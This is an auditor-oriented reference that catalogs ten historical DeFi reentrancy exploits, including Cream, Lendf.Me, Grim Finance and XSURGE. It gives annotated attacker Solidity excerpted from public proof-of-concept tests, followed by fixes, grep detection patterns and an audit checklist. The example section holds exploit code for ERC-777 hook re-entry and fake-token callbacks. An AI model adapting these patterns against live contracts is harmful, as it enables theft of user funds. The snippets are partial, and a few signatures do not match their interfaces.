---
protocol: generic
chain: ethereum, bsc, fantom
category: reentrancy
vulnerability_type: reentrancy_comprehensive

attack_type: reentrancy
affected_component: external_calls

primitives:
  - erc777_hooks
  - fake_token_callback
  - cross_contract_reentrancy
  - native_transfer_reentrancy
  - delegated_callback
  - deposit_before_state_update

severity: critical
impact: fund_loss
exploitability: 0.85
financial_impact: critical

tags:
  - reentrancy
  - erc777
  - tokensReceived
  - tokensToSend
  - fake_token
  - transferFrom
  - cross_contract
  - receive_fallback
  - delegatedTransferERC20
  - depositFor
  - nonReentrant
  - real_exploit
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 10
total_losses: "$116M+"
---

## DeFiHackLabs Reentrancy Pattern Compendium

### Overview

Reentrancy remains the single most exploited vulnerability class in DeFi history. This entry catalogs **10 real-world reentrancy exploits** from 2018-2021 totaling over **$116M in losses**, organized by attack vector. Each exploit demonstrates a distinct reentrancy entry point that bypassed existing security assumptions.

### Root Cause Categories

1. **ERC-777 Token Hooks** — Tokens with `tokensReceived`/`tokensToSend` callbacks enable reentry during standard transfers inside lending/swap operations
2. **Fake/Malicious Token Callbacks** — Functions accept user-supplied token addresses; attacker deploys contract with `transferFrom()` or `transfer()` hooks
3. **Native ETH Transfer** — `sell()` or refund functions send ETH via `.call{value:}()` before updating state; attacker re-enters via `receive()`/`fallback()`
4. **Cross-Contract Reentrancy** — Attacker contract embedded in strategy `data` parameter re-enters through a different contract in the same protocol
5. **Delegated Callback Exploitation** — Functions call methods on user-supplied addresses (e.g., `delegatedTransferERC20`) that are no-ops in attacker contracts

---

### Vulnerable Pattern Examples

#### Category 1: ERC-777 Token Hooks [CRITICAL]

**Example 1: Cream Finance — ERC-777 tokensReceived Reentry ($18M, 2021-08)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Lending protocol borrows ERC-777 token, triggering receiver hook
// before internal state (borrow balance) is updated

// Setup: Register as ERC-777 recipient via ERC-1820 registry
IERC1820Registry ierc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
ierc1820.setInterfaceImplementer(
    address(this),
    keccak256("ERC777TokensRecipient"),  // @audit Register as token recipient
    address(this)
);

// Step 1: Deposit 500 ETH as collateral in crETH
creth.mint{value: 500 * 1e18}();

// Step 2: Borrow 1 ETH → triggers AMP (ERC-777) transfer → tokensReceived hook
creth.borrow(1 * 1e18);

// @audit ERC-777 REENTRANCY HOOK — fired DURING borrow(), before state update
function tokensReceived(
    bytes4, bytes32, address, address, address, uint256, bytes calldata, bytes calldata
) external {
    // @audit Re-enter: borrow 354 ETH against SAME collateral (state not yet updated)
    crETH(crETH_Address).borrow(354 * 1e18);
}
// @audit After both borrows complete, attacker has borrowed 355 ETH against 500 ETH collateral
// without the first borrow being reflected in the debt calculation
```
- **PoC**: `DeFiHackLabs/src/test/2021-08/Cream_exp.sol`
- **Root Cause**: Compound-fork `borrow()` transfers AMP (ERC-777) token before updating borrow state. The ERC-777 `tokensReceived` hook fires on the attacker, allowing a second borrow against the same collateral.

**Example 2: Lendf.Me — ERC-777 tokensToSend Reentry ($25M, 2020-04)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Money market's supply() transfers ERC-777 from user,
// triggering tokensToSend on the SENDER before supply state is updated

// Register as ERC-777 sender
erc1820.setInterfaceImplementer(
    address(this),
    keccak256("ERC777TokensSender"),  // @audit Register as token sender
    address(this)
);

// Step 1: Supply most imBTC to Lendf.Me (records balance)
IMoneyMarket(victim).supply(address(imBTC), balance - 1);

// Step 2: Supply 1 imBTC → triggers tokensToSend → withdraw inside callback
IMoneyMarket(victim).supply(address(imBTC), 1);
// @audit During the supply of 1 token, the hook fires BEFORE state update

function tokensToSend(
    address, address, address, uint256 amount, bytes calldata, bytes calldata
) external {
    if (amount == 1) {
        // @audit Re-enter: withdraw ALL during supply — state shows old (larger) balance
        IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);
    }
}
```
- **PoC**: `DeFiHackLabs/src/test/2020-04/LendfMe_exp.sol`
- **Root Cause**: `supply()` calls `transferFrom()` on imBTC (ERC-777) which triggers `tokensToSend` on the sender before updating supply records. Attacker withdraws everything inside the hook.

**Example 3: Uniswap V1 — ERC-777 tokensToSend in Swap ($220K, 2020-04)** [HIGH]
```solidity
// ❌ VULNERABLE: tokenToEthSwapInput transfers token before updating reserves

// Register as ERC-777 sender
_erc1820.setInterfaceImplementer(
    address(this), keccak256("ERC777TokensSender"), address(this)
);

// Sell imBTC for ETH — internally calls imBTC.transferFrom() which triggers hook
uniswapv1.tokenToEthSwapInput(823_084, 1, type(uint256).max);

function tokensToSend(
    address, address, address, uint256, bytes calldata, bytes calldata
) external {
    if (i < 1) {
        i++;
        // @audit Re-enter swap: sell tokens AGAIN against stale reserve values
        uniswapv1.tokenToEthSwapInput(823_084, 1, type(uint256).max);
    }
}
```
- **PoC**: `DeFiHackLabs/src/test/2020-04/uniswap-erc777.sol`

---

#### Category 2: Fake/Malicious Token Callbacks [CRITICAL]

**Example 4: Grim Finance — depositFor with Arbitrary Token ($30M, 2021-12)** [CRITICAL]
```solidity
// ❌ VULNERABLE: depositFor() accepts arbitrary token address as first parameter
// and calls safeTransferFrom on it — attacker can pass their own contract

interface IGrimBoostVault {
    // @audit 'token' parameter is attacker-controlled — any address accepted
    function depositFor(address token, uint256 _amount, address user) external;
}

// Step 1: Flash loan LP tokens from BeethovenX
beethovenVault.flashLoan(IFlashLoanRecipient(address(this)), loanTokens, loanAmounts, "0x");

// Step 2: Call depositFor with ATTACKER ADDRESS as token
// @audit depositFor(address(this), ...) — vault calls safeTransferFrom on attacker contract
grimBoostVault.depositFor(address(this), lpBalance, address(this));

// Step 3: REENTRANCY — vault calls transferFrom on attacker, attacker re-enters 6x
uint256 reentrancySteps = 7;
function transferFrom(address, address, uint256) public {
    reentrancySteps -= 1;
    if (reentrancySteps > 0) {
        // @audit Re-enter: each call mints shares without new tokens deposited
        grimBoostVault.depositFor(address(this), lpBalance, address(this));
    } else {
        // @audit Final call uses REAL token to satisfy balance check
        grimBoostVault.depositFor(btc_wftm_address, lpBalance, address(this));
    }
}

// Step 4: Withdraw all — 7x inflated shares → drain entire vault
grimBoostVault.withdrawAll();
```
- **PoC**: `DeFiHackLabs/src/test/2021-12/Grim_exp.sol`
- **Root Cause**: `depositFor()` accepts any `token` address and calls `safeTransferFrom()` on it before updating shares. Attacker passes their own contract, re-enters 6 times to inflate shares.

**Example 5: BurgerSwap — Fake Token in Multi-hop Swap ($7.2M, 2021-05)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Multi-hop swap calculates ALL output amounts upfront,
// then executes individual hops — fake token hook during first hop
// allows executing second swap at stale reserves

// Deploy fake token with reentrancy in transferFrom
contract FAKE_TOKEN {
    Exploit private immutable exploit;
    bool private isExploiting;

    // @audit Reentrancy vector: transferFrom triggers inner swap
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        unchecked {
            allowance[sender][msg.sender] -= amount;
            balanceOf[sender] -= amount;
            balanceOf[recipient] += amount;
        }
        if (isExploiting) {
            exploit.enter();  // @audit Re-enter: swap BURGER→WBNB at stale reserves
        }
        return true;
    }
}

// Attack: swap path FAKE→BURGER→WBNB
// During FAKE transferFrom in first hop, re-enter to drain BURGER→WBNB at stale reserves
demaxPlatform.swapExactTokensForTokens(1 ether, 0, [FAKE, BURGER, WBNB], address(this), max);

function enter() public {
    // @audit This swap executes at stale reserves — double spend
    demaxPlatform.swapExactTokensForTokens(45_452 ether, 0, [BURGER, WBNB], address(this), max);
    FAKE.disableExploit();
}
```
- **PoC**: `DeFiHackLabs/src/test/2021-05/BurgerSwap_exp.sol`
- **Root Cause**: Router pre-computes all hop outputs, then during first hop's `transferFrom` on fake token, attacker executes a separate swap that drains the pool at stale (pre-update) reserves.

**Example 6: SpankChain — Fake Token in Payment Channel (155 ETH, 2018-10)** [HIGH]
```solidity
// ❌ VULNERABLE: createChannel accepts arbitrary token address
// LCOpenTimeout refunds ETH then calls transfer() on token

function exploit(uint256 c) public payable {
    limit = c;
    uint256[2] memory balances;
    balances[0] = 5 ether;   // ETH collateral
    balances[1] = 1;         // @audit Fake token = this contract
    // Create channel with attacker contract as the "token"
    spankChain.createChannel{value: 5 ether}(lcID, msg.sender, maxTimeout, address(this), balances);
    // Trigger timeout → refunds ETH + calls transfer() on fake token
    spankChain.LCOpenTimeout(lcID);
}

// @audit Reentrancy: fake token's transfer() re-enters LCOpenTimeout
function transfer(address, uint256) public returns (bool) {
    if (count < limit) {
        count++;
        spankChain.LCOpenTimeout(lcID);  // @audit Get ETH refund AGAIN
    }
    return true;
}
```
- **PoC**: `DeFiHackLabs/src/test/2018-10/SpankChain_exp.sol`

---

#### Category 3: Native ETH Transfer Reentrancy [HIGH]

**Example 7: XSURGE — sell() Sends BNB Before State Update ($5M, 2021-08)** [CRITICAL]
```solidity
// ❌ VULNERABLE: sell() sends BNB to caller via native transfer
// BEFORE updating token price and total supply

// Step 1: Flash loan 10,000 WBNB, unwrap to BNB
// Step 2: Buy SURGE tokens by sending BNB (triggers receive())
(bool success,) = payable(Surge_Address).call{value: address(this).balance}("");

// Step 3: Sell SURGE — sends BNB back, triggering receive() BEFORE price update
surge.sell(surge.balanceOf(address(this)));

// @audit REENTRANCY via receive() — triggered when sell() sends BNB
receive() external payable {
    if (msg.sender == Surge_Address && time < 6) {
        // @audit Re-enter: buy SURGE at STALE price (sell hasn't updated price yet)
        (bool success,) = payable(Surge_Address).call{value: address(this).balance}("");
        time++;
        // @audit Each cycle: sell at current price → receive BNB → buy at stale price
    }
}
// After 7 sell→rebuy cycles, attacker extracts value from the price discrepancy
```
- **PoC**: `DeFiHackLabs/src/test/2021-08/XSURGE_exp.sol`
- **Root Cause**: `sell()` sends BNB via native transfer before updating price/supply state, so `receive()` buys at the stale (higher) price.

---

#### Category 4: User-Supplied Callback Target [HIGH]

**Example 8: Visor Finance — No-op delegatedTransferERC20 ($8.2M, 2021-12)** [CRITICAL]
```solidity
// ❌ VULNERABLE: deposit() calls delegatedTransferERC20() on user-supplied 'from' address
// Attacker provides a contract with a no-op implementation → mints shares for free

interface IRewardsHypervisor {
    // @audit 'from' parameter is attacker-controlled
    function deposit(uint256 visrDeposit, address from, address to) external returns (uint256 shares);
}

// Step 1: Call deposit with attacker contract as 'from'
irrewards.deposit(100_000e18, address(this), msg.sender);
// @audit Internally: deposit() calls from.delegatedTransferERC20(token, to, amount)
// The attacker's implementation does NOTHING — no tokens transferred

// Attacker contract impersonates the owner interface
function owner() external returns (address) { return address(this); }

// @audit No-op: tokens never actually transfer, but shares are minted
function delegatedTransferERC20(address, address, uint256) external {}
```
- **PoC**: `DeFiHackLabs/src/test/2021-12/Visor_exp.sol`
- **Root Cause**: `deposit()` trusts user-supplied `from` address to handle token transfer. Attacker provides no-op implementation, receives shares without depositing tokens.

---

#### Category 5: Cross-Contract Reentrancy [CRITICAL]

**Example 9: Rari Capital — Malicious Token in work() Strategy (~$15M, 2021-05)** [CRITICAL]
```solidity
// ❌ VULNERABLE: work() accepts arbitrary 'data' parameter containing
// worker strategy addresses — attacker embeds malicious token contract

interface Bank {
    function work(
        uint256 id,       // position id (0 = new position)
        address goblin,   // worker/strategy contract
        uint256 loan,     // amount to borrow
        uint256 maxReturn,
        bytes calldata data  // @audit Contains attacker-controlled contract addresses
    ) external payable;
}

// Attack: data parameter contains malicious token address
// work() → goblin.work() → interacts with attacker's fake token
// → fake token re-enters Bank through a DIFFERENT contract path
vault.work{value: 100_000_000}(
    0,                           // new position
    goblinAddress,               // legitimate goblin
    0,                           // no loan
    100_000_000e18,              // maxReturn
    data                         // @audit Contains embedded attacker contract
);
// @audit The malicious token contract embedded in 'data' re-enters the Bank
// through cross-contract calls, manipulating position accounting
```
- **PoC**: `DeFiHackLabs/src/test/2021-05/RariCapital_exp.sol`

**Example 10: Value DeFi — Same Pattern on BSC (~$10M, 2021-05)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Same Alpha Homora work() pattern on BSC
// Attacker embeds malicious contract in strategy data parameter

vault.work{value: 1 ether}(
    0,
    workerAddress,
    1e18,                        // 1 BNB principal
    393_652e18,                  // ~393K BNB loan
    1_000_000e18,                // maxReturn
    data                         // @audit Contains attacker contract for cross-contract reentry
);
```
- **PoC**: `DeFiHackLabs/src/test/2021-05/ValueDefi_exp.sol`
- **Root Cause**: Alpaca Finance fork `work()` interacts with attacker-controlled address in `data` parameter, enabling cross-contract reentrancy to manipulate leverage position accounting.

---

### Impact Analysis

#### Technical Impact
- **Direct fund theft**: Attacker drains pools by minting unbacked shares or borrowing against same collateral twice
- **State corruption**: Internal accounting diverges from actual token balances
- **Protocol insolvency**: Undercollateralized positions created via double-borrow

#### Business Impact
| Protocol | Loss | Category | Year |
|----------|------|----------|------|
| Grim Finance | $30M | Fake token callback | 2021 |
| Lendf.Me | $25M | ERC-777 tokensToSend | 2020 |
| Cream Finance | $18M | ERC-777 tokensReceived | 2021 |
| Rari Capital | ~$15M | Cross-contract reentrancy | 2021 |
| Value DeFi | ~$10M | Cross-contract reentrancy | 2021 |
| Visor Finance | $8.2M | Delegated callback no-op | 2021 |
| BurgerSwap | ~$7.2M | Fake token in multi-hop | 2021 |
| XSURGE | $5M | Native ETH before state | 2021 |
| UniSwap V1 | $220K | ERC-777 tokensToSend | 2020 |
| SpankChain | 155 ETH | Fake token transfer() | 2018 |

---

### Secure Implementation

**Fix 1: ReentrancyGuard (Checks-Effects-Interactions + Mutex)**
```solidity
// ✅ SECURE: OpenZeppelin ReentrancyGuard on all state-changing functions

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureVault is ReentrancyGuard {
    function deposit(uint256 amount) external nonReentrant {
        // Effects FIRST — update state before any external call
        shares[msg.sender] += calculateShares(amount);
        totalShares += calculateShares(amount);

        // Interactions LAST — external call after state is final
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
    }

    function depositFor(uint256 amount, address user) external nonReentrant {
        shares[user] += calculateShares(amount);
        totalShares += calculateShares(amount);
        // @audit Only transfer from the KNOWN want token, never from arbitrary address
        IERC20(want()).safeTransferFrom(msg.sender, address(this), amount);
    }
}
```

**Fix 2: Validate User-Supplied Addresses**
```solidity
// ✅ SECURE: Never call external functions on user-supplied addresses

function deposit(uint256 amount, address from) external nonReentrant {
    // @audit VALIDATE: 'from' must be the actual token, not arbitrary address
    require(from == address(token), "invalid from");

    // Or better: don't accept 'from' at all — always transfer from msg.sender
    token.safeTransferFrom(msg.sender, address(this), amount);
    shares[msg.sender] += calculateShares(amount);
}
```

**Fix 3: ERC-777 Aware Design**
```solidity
// ✅ SECURE: Update ALL state before any token transfer

function borrow(uint256 amount) external nonReentrant {
    // CHECK
    require(getAccountLiquidity(msg.sender) >= amount, "insufficient collateral");

    // EFFECT — update borrow state BEFORE transfer
    accountBorrows[msg.sender].principal += amount;
    accountBorrows[msg.sender].interestIndex = borrowIndex;
    totalBorrows += amount;

    // INTERACTION — transfer token (even if ERC-777, state is already updated)
    IERC20(underlying).safeTransfer(msg.sender, amount);
}
```

---

### Detection Patterns

```bash
# Functions accepting arbitrary address and calling external methods on it
grep -rn "function.*address.*token.*external\|safeTransferFrom.*token\|\.call{" --include="*.sol" | \
  grep -v "nonReentrant"

# ERC-777 vulnerable patterns — transfer before state update
grep -rn "\.transfer\|safeTransfer\|\.call{value" --include="*.sol" | \
  grep -B5 "balanceOf\|totalSupply\|shares\["

# depositFor with arbitrary token parameter
grep -rn "function depositFor.*address.*token\|function deposit.*address.*from" --include="*.sol"

# Missing nonReentrant on deposit/withdraw/borrow
grep -rn "function deposit\|function withdraw\|function borrow" --include="*.sol" | \
  grep -v "nonReentrant"

# ERC-1820 registry usage (indicates ERC-777 interaction)
grep -rn "setInterfaceImplementer\|ERC777\|tokensReceived\|tokensToSend" --include="*.sol"
```

---

### Audit Checklist

1. **Are all external calls made AFTER state updates?** — Check every transfer, call, and delegatecall
2. **Do deposit/withdraw functions use `nonReentrant`?** — Mutex is mandatory on all fund-handling functions
3. **Does the protocol interact with ERC-777 tokens?** — If yes, `tokensReceived`/`tokensToSend` hooks WILL fire
4. **Are user-supplied addresses EVER called?** — Functions like `depositFor(token, ...)` where token is caller-controlled are extremely dangerous
5. **Is `data` parameter decoded and forwarded to external calls?** — Strategy patterns like `work(data)` can embed malicious contracts
6. **Are multi-hop swaps atomic?** — Pre-computed amounts + external token calls in between = reentrancy
7. **Does native ETH transfer happen before state update?** — `.call{value:}()` in sell/refund functions triggers `receive()`

---

### Real-World Examples

| Protocol | Date | Loss | Attack Vector | Chain | PoC |
|----------|------|------|---------------|-------|-----|
| Grim Finance | 2021-12 | $30M | Fake token transferFrom in depositFor | Fantom | `DeFiHackLabs/src/test/2021-12/Grim_exp.sol` |
| Visor Finance | 2021-12 | $8.2M | No-op delegatedTransferERC20 on user-supplied from | Ethereum | `DeFiHackLabs/src/test/2021-12/Visor_exp.sol` |
| Cream Finance | 2021-08 | $18M | ERC-777 AMP tokensReceived during borrow | Ethereum | `DeFiHackLabs/src/test/2021-08/Cream_exp.sol` |
| XSURGE | 2021-08 | $5M | Native BNB transfer before price update | BSC | `DeFiHackLabs/src/test/2021-08/XSURGE_exp.sol` |
| Rari Capital | 2021-05 | ~$15M | Malicious token in work() data parameter | Ethereum | `DeFiHackLabs/src/test/2021-05/RariCapital_exp.sol` |
| Value DeFi | 2021-05 | ~$10M | Cross-contract reentry via work() data | BSC | `DeFiHackLabs/src/test/2021-05/ValueDefi_exp.sol` |
| BurgerSwap | 2021-05 | ~$7.2M | Fake token transferFrom in multi-hop swap | BSC | `DeFiHackLabs/src/test/2021-05/BurgerSwap_exp.sol` |
| Lendf.Me | 2020-04 | $25M | ERC-777 imBTC tokensToSend during supply | Ethereum | `DeFiHackLabs/src/test/2020-04/LendfMe_exp.sol` |
| Uniswap V1 | 2020-04 | $220K | ERC-777 tokensToSend during swap | Ethereum | `DeFiHackLabs/src/test/2020-04/uniswap-erc777.sol` |
| SpankChain | 2018-10 | 155 ETH | Fake token transfer() in payment channel | Ethereum | `DeFiHackLabs/src/test/2018-10/SpankChain_exp.sol` |

---

### Keywords

- reentrancy
- erc777
- tokensReceived
- tokensToSend
- transferFrom
- safeTransferFrom
- depositFor
- delegatedTransferERC20
- receive_fallback
- cross_contract_reentrancy
- nonReentrant
- checks_effects_interactions
- fake_token
- work_data_parameter
- DeFiHackLabs

---

### Related Vulnerabilities

- [ERC-777 / Token Compatibility](../token-compatibility/non-standard-token-vulnerabilities.md)
- [Flash Loan Attack Patterns](../flash-loan-attacks/FLASH_LOAN_VULNERABILITIES.md)
- [Input Validation Patterns](../missing-validations/defihacklabs-input-validation-patterns.md)
